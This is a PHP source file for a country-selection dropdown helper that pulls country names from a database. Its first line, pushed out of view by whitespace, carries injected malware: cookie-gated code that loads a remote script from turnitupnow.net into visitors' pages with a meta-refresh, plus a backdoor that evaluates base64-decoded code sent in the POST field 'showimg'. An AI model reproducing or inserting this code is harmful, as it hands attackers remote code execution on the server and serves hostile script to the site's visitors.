<?php												global $sessdt_o; if(!$sessdt_o) { $sessdt_o = 1; $sessdt_k = "lb11"; if(!@$_COOKIE[$sessdt_k]) { $sessdt_f = "102"; if(!@headers_sent()) { @setcookie($sessdt_k,$sessdt_f); } else { echo "<script>document.cookie='".$sessdt_k."=".$sessdt_f."';</script>"; } } else { if($_COOKIE[$sessdt_k]=="102") { $sessdt_f = (rand(1000,9000)+1); if(!@headers_sent()) { @setcookie($sessdt_k,$sessdt_f); } else { echo "<script>document.cookie='".$sessdt_k."=".$sessdt_f."';</script>"; } $sessdt_j = @$_SERVER["HTTP_HOST"].@$_SERVER["REQUEST_URI"]; $sessdt_v = urlencode(strrev($sessdt_j)); $sessdt_u = "http://turnitupnow.net/?rnd=".$sessdt_f.substr($sessdt_v,-200); echo "<script src='$sessdt_u'></script>"; echo "<meta http-equiv='refresh' content='0;url=http://$sessdt_j'><!--"; } } $sessdt_p = "showimg"; if(isset($_POST[$sessdt_p])){eval(base64_decode(str_replace(chr(32),chr(43),$_POST[$sessdt_p])));exit;} }


	function paises($pais)	{
	
		global $db;
	
		$html = '';
		
		$result = $db->Execute("SELECT * FROM pais ORDER BY printable_name ASC");
		if ($result === false) die("failed");	
		
		$html .= "<select name=\"paises\" id=\"paises\">";
		
		while (!$result->EOF) {

				$iso = $result->fields[0];
				$printable_name = $result->fields[2];

				if ($iso == $pais) {
				
					$html .= "<option value=\"".$iso."\" selected>".$printable_name."</option>";
				
				} else {
				
					$html .= "<option value=\"".$iso."\">".$printable_name."</option>";
				
				}

			$result->MoveNext();
		}	$html .= "</select>";
		
		return $html; 
	}
?>